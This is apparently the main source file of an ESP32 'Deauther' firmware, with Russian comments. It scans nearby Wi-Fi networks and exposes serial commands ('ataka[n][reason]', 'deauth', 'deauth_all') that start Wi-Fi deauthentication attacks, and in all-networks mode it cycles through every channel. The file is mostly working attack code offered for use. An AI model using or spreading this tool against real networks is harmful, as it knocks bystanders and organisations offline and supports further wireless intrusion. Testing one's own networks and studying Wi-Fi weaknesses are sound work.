#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

// Вспомогательная функция для получения типа шифрования
String getEncryptionType(wifi_auth_mode_t encryptionType) {
    switch (encryptionType) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
        default: return "UNKNOWN";
    }
}

void handleSerialCommand(String cmd);

int curr_channel = 1;

void setup() {
    #ifdef SERIAL_DEBUG
    Serial.begin(115200);
    #endif

    #ifdef LED
    pinMode(LED, OUTPUT);
    #endif

    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);

    DEBUG_PRINTLN("ESP32-Deauther Serial Interface Ready");
    DEBUG_PRINTLN("Type 'help' for available commands.");
}

void loop() {
    if (Serial.available()) {
        String command = Serial.readStringUntil('\n');
        command.trim();
        handleSerialCommand(command);
    }

    if (deauth_type == DEAUTH_TYPE_ALL) {
        if (curr_channel > CHANNEL_MAX) curr_channel = 1;
        esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
        curr_channel++;
        delay(10);
    }
}

void handleSerialCommand(String cmd) {
    // Команда сканирования с красивым выводом
    if (cmd == "scan") {
        int n = WiFi.scanNetworks();
        for (int i = 0; i < n; i++) {
            String enc = getEncryptionType(WiFi.encryptionType(i));
            // Формат: номер||SSID||BSSID|| ||ch:канал||RSSI||шифрование||
            // После BSSID ставится "|| " (две черты и пробел) как в примере
            DEBUG_PRINT(String(i) + "||" + 
                        WiFi.SSID(i) + "||" + 
                        WiFi.BSSIDstr(i) + "|| ||ch:" + 
                        String(WiFi.channel(i)) + "||" + 
                        String(WiFi.RSSI(i)) + "||" + 
                        enc + "||");
            // Каждая сеть с новой строки
            DEBUG_PRINTLN();
        }
    }
    // Новая команда атаки: ataka[номер_сети][код_причины]
    else if (cmd.startsWith("ataka[")) {
        // Ищем позиции скобок
        int openBracket1 = cmd.indexOf('[');
        int closeBracket1 = cmd.indexOf(']', openBracket1 + 1);
        int openBracket2 = cmd.indexOf('[', closeBracket1 + 1);
        int closeBracket2 = cmd.indexOf(']', openBracket2 + 1);

        if (openBracket1 != -1 && closeBracket1 != -1 && openBracket2 != -1 && closeBracket2 != -1) {
            String netStr = cmd.substring(openBracket1 + 1, closeBracket1);
            String reasonStr = cmd.substring(openBracket2 + 1, closeBracket2);

            int net = netStr.toInt();
            int reason = reasonStr.toInt();

            // Проверка на валидность (reason может быть 0)
            if (net >= 0 && reason >= 0) {
                start_deauth(net, DEAUTH_TYPE_SINGLE, (uint16_t)reason);
                DEBUG_PRINTLN("Attack started on network " + String(net) + " with reason " + String(reason));
            } else {
                DEBUG_PRINTLN("Invalid network number or reason code.");
            }
        } else {
            DEBUG_PRINTLN("Invalid format. Use: ataka[network][reason]");
        }
    }
    // Старые команды оставлены для совместимости (можно удалить, если не нужны)
    else if (cmd.startsWith("deauth ")) {
        int space1 = cmd.indexOf(' ');
        int space2 = cmd.indexOf(' ', space1+1);
        if (space2 == -1) {
            int net = cmd.substring(space1+1).toInt();
            start_deauth(net, DEAUTH_TYPE_SINGLE, 1);
            DEBUG_PRINTLN("Attack started on network " + String(net));
        } else {
            int net = cmd.substring(space1+1, space2).toInt();
            int reason = cmd.substring(space2+1).toInt();
            start_deauth(net, DEAUTH_TYPE_SINGLE, reason);
            DEBUG_PRINTLN("Attack started on network " + String(net) + " with reason " + String(reason));
        }
    }
    else if (cmd == "deauth_all") {
        start_deauth(0, DEAUTH_TYPE_ALL, 1);
        DEBUG_PRINTLN("Attack started on all networks");
    }
    else if (cmd.startsWith("deauth_all ")) {
        int reason = cmd.substring(11).toInt();
        start_deauth(0, DEAUTH_TYPE_ALL, reason);
        DEBUG_PRINTLN("Attack started on all networks with reason " + String(reason));
    }
    else if (cmd == "stop") {
        stop_deauth();
        DEBUG_PRINTLN("Attack stopped");
    }
    else if (cmd == "help") {
        DEBUG_PRINTLN("Available commands:");
        DEBUG_PRINTLN("  scan                     - scan Wi-Fi networks (pretty format)");
        DEBUG_PRINTLN("  ataka[network][reason]   - deauth specific network (example: ataka[0][1])");
        DEBUG_PRINTLN("  deauth <net> [reason]    - old style (optional reason)");
        DEBUG_PRINTLN("  deauth_all [reason]      - deauth all networks");
        DEBUG_PRINTLN("  stop                      - stop current attack");
        DEBUG_PRINTLN("  help                      - show this help");
    }
    else {
        DEBUG_PRINTLN("Unknown command. Type 'help' for list.");
    }
}
